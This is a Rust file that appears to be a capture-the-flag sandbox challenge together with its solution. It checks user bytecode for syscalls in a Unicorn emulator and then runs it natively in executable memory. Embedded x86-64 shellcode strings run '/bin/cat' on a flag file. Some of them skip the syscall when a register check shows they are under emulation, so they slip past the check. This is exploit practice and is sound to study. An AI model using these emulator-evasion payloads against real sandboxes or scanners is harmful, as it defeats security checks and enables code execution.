use std::io::{self, Bytes};
use std::io::Read;
use std::process;
use region::Protection;
use nix::unistd::alarm;
use nix::sys::signal::*;
use unicorn_engine::{Unicorn, InsnSysX86, RegisterX86};
use unicorn_engine::unicorn_const::{Arch, Mode, Permission, uc_error};

static STACK_ADDR: u64 = 0x700000;
static STACK_SIZE: u64 = 1024*1024;
static BASE_ADDR: u64 = 0x400000;
static IMG_SIZE: u64 = 1024*1024;
static TIMEOUT: u32 = 0xFFFFFF;

// Ignore me
extern fn signal_handler(_signal: i32) {
    panic!("[!] Timed out...")
}

// Emulate bytecode using unicorn
// Checking for syscall and sysenter for sEcUrItY reasons
fn emulate_bytecode(code: &Vec<u8>) -> Result<(), uc_error> {
    let mut unicorn = Unicorn::new(Arch::X86, Mode::MODE_64)?;
    let emu = &mut unicorn;

    // Setup Memory
    emu.mem_map(BASE_ADDR, IMG_SIZE as usize, Permission::ALL)?;
    emu.mem_map(STACK_ADDR, STACK_SIZE as usize, Permission::ALL)?;
    emu.mem_write(BASE_ADDR, code)?;

    // Setup Registers
    emu.reg_write(RegisterX86::RSP, STACK_ADDR + STACK_SIZE - 1)?;

    // Add hooks
    emu.add_insn_sys_hook(InsnSysX86::SYSCALL, 1, 0, |uc| {
        panic!("[!] Syscall detected: {uc:?}");
    })?;
    emu.add_insn_sys_hook(InsnSysX86::SYSENTER, 1, 0, |uc| {
        panic!("[!] Sysenter detected: {uc:?}");
    })?;

    // Run emulation
    emu.emu_start(BASE_ADDR, (BASE_ADDR as usize + code.len()) as u64, 0, 0)?;
    Ok(())
}

fn execute_bytecode(code: &Vec<u8>) {
    unsafe {
        let alloc = region::alloc(code.len(), Protection::READ_WRITE_EXECUTE).unwrap();
        let slice = std::slice::from_raw_parts_mut(alloc.as_ptr::<u8>() as *mut u8, alloc.len());
        slice[..code.len()].copy_from_slice(&code);
        let fn_ptr: fn() = std::mem::transmute(alloc.as_ptr::<u8>());
        fn_ptr();
    }
}

fn main() {
    // Ignore me
    let handler = SigHandler::Handler(signal_handler);
    unsafe { signal(Signal::SIGALRM, handler)}.unwrap();
    alarm::set(TIMEOUT);
    //let uinput=b"\x6a\x42\xe8\x41\x00\x00\x00\x5f\x48\xb8\x08\x10\x40\x00\x00\x00\x00\x00\x48\x3d\xff\xff\xff\x0f\x72\x34\xeb\x00\xeb\x20\x58\x48\x31\xd2\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x63\x61\x74\x51\x48\x89\xe7\x52\x50\x57\x48\x31\xc0\x48\x89\xe6\xb0\x3b\x0f\x05\xe8\xdb\xff\xff\xff\x66\x6c\x61\x67\xba\x34\x12\x00\x00\xc3\xba\x23\x01\x00\x00\xb8\x01\x00\x00\x00\x31\xdb\xcd\x80";
    //let uinput = b"\x6a\x42\xe8\x3f\x00\x00\x00\x5f\x48\xb8\x08\x10\x40\x00\x00\x00\x00\x00\x48\x3d\x00\x00\x41\x00\x72\x32\xe8\x05\x00\x00\x00\x66\x6c\x61\x67\x00\x58\x48\x31\xd2\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x63\x61\x74\x51\x48\x89\xe7\x52\x50\x57\x48\x31\xc0\x48\x89\xe6\x30\xc0\x04\x3b\x0f\x05\xba\x78\x56\x34\x12\xc3\xba\x78\x56\x34\x12";
    //sh let uinput=b"\x48\x89\xc3\x48\x31\xc0\x50\x48\x89\xe0\x48\x31\xd2\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x63\x61\x74\x51\x48\x89\xe7\x52\x50\x57\x48\x31\xc0\x48\x89\xe6\x30\xc0\x04\x3b\x48\x81\xfb\x41\x41\x41\x41\x76\x02\x0f\x05\xba\x78\x56\x34\x12";
    //let uinput=b"\x48\x89\xc3\xb8\x66\x6c\x61\x67\x48\xf7\xd8\x50\x48\x89\xe0\x48\x31\xd2\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x63\x61\x74\x51\x48\x89\xe7\x52\x50\x57\x48\x31\xc0\x48\x89\xe6\x30\xc0\x04\x3b\x48\x81\xfb\x41\x41\x41\x41\x76\x02\x0f\x05\xba\x78\x56\x34\x12\x00";
    let uinput=b"\x48\x89\xc3\x48\x31\xd2\x48\xb8\xd1\x99\x93\x9e\x98\xff\xff\xff\x48\xf7\xd8\x50\x48\xb8\x68\x6f\x6d\x65\x2f\x63\x74\x66\x50\x48\x89\xe0\x52\x48\xb9\x2f\x62\x69\x6e\x2f\x63\x61\x74\x51\x48\x89\xe7\x52\x50\x57\x48\x31\xc0\x48\x89\xe6\x30\xc0\x04\x3b\x48\x81\xfb\x41\x41\x41\x41\x76\x02\x0f\x05\xba\x78\x56\x34\x12\x00";
    println!("My pid is {}", process::id());
    println!("Bytecode: ");
    let mut user_input: Vec<u8> = Vec::new();
    for i in uinput {
        match i {
            0x00 => break,
            x => user_input.push(*x),
        }
    }
    //execute_bytecode(&user_input);

    println!("[+] Checking for malicious instructions...");
    match emulate_bytecode(&user_input) {
        Ok(_) => println!("[+] Looks 100% secure to run this on the host machine"),
        Err(err) => panic!("[!] Emulation failed {err:?}"),
    };

    println!("[+] Starting execution...");
    execute_bytecode(&user_input)
}
